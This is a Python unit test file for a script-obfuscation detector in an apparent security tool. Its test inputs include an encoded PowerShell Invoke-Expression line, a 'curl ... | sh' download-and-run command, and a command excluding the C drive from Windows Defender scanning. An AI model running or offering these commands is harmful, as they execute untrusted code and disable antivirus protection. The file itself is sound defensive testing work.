import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import context  # noqa: F401
from awtest import art, ids  # noqa: E402

from agentwatch.detectors.script_obfuscation import ScriptObfuscationDetector  # noqa: E402


class ScriptObfuscation(unittest.TestCase):
    def test_obfuscation_positive(self):
        text = "powershell.exe -enc SQBFAFgA\nInvoke-Expression $payload"
        findings = ScriptObfuscationDetector().run(art("run.ps1", text))
        self.assertIn("AW-S001", ids(findings))

    def test_download_pipe_positive(self):
        findings = ScriptObfuscationDetector().run(art("install.sh", "curl http://x/y | sh"))
        self.assertIn("AW-S001", ids(findings))

    def test_defender_tamper_positive(self):
        findings = ScriptObfuscationDetector().run(
            art("a.ps1", "Add-MpPreference -ExclusionPath C:\\")
        )
        self.assertIn("AW-S001", ids(findings))

    def test_obfuscation_negative(self):
        self.assertEqual(ScriptObfuscationDetector().run(art("hello.txt", "good morning")), [])


if __name__ == "__main__":
    unittest.main()
